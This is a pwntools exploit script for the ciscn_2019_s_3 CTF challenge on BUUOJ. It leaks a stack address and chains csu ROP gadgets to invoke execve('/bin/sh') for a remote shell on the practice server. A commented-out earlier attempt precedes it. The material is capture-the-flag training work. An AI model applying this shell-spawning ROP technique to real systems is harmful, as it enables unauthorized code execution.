# from pwn import *
#
#
# def ciscn_2019_s_3(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_s_3'):
#     print('ciscn_2019_s_3 start')
#     context(log_level='debug', arch='amd64', os='linux')
#     target = process([file_name])
#     # target = remote('', 123)
#     target_elf = ELF(file_name)
#
#     pop_ret_gadget = p64(0x4005a3)  # pop rdi ; ret
#     pop2_ret_gadget = p64(0x4005a1)  # pop rsi ; pop r15 ; ret
#
#     libc_start_main_got = p64(target_elf.got['__libc_start_main'])
#     sys_call_addr = p64(0x400517)
#
#     payload = b'a' * 16
#     # sys_write(1u, buf, 0x30uLL);
#     payload += pop_ret_gadget + p64(0x1)
#     payload += pop2_ret_gadget + libc_start_main_got + p64(0x0)
#     payload += sys_call_addr
#
#     # gdb.attach(target)
#     target.sendline(payload)
#     print(target.recv())
#     print(target.recv())
#     print('ciscn_2019_s_3 end')
#
#
# if __name__ == '__main__':
#     ciscn_2019_s_3()

# 做不出
from pwn import *

elf = ELF("/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_s_3")
p = process("/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_s_3")
p = remote("node4.buuoj.cn",26528)
pop_rbx_rbp_r12_r13_r14_r15 = 0x0040059A
mov_rdx_r13_call = 0x0400580
pop_rdi_ret = 0x04005A3
vuln_addr = 0x0004004ED
sysecve_addr = 0x004004E2
syscall_addr =0x400501

payload = b'/bin/sh\x00' + b'A' * 0x8 + p64(vuln_addr)
p.sendline(payload)
p.recv(0x20)
binsh = u64(p.recv(8)) - 0x118
print(hex(binsh))
payload = b"/bin/sh\x00" + b"a"*0x8
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) * 2
payload += p64(binsh+0x50)
payload += p64(0) * 3  #这里不能直接把/bin/sh通过csu给rdi寄存器，这里只能控制rdi的低32位edi
payload += p64(mov_rdx_r13_call)
payload += p64(sysecve_addr)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(syscall_addr)
p.sendline(payload)
p.interactive()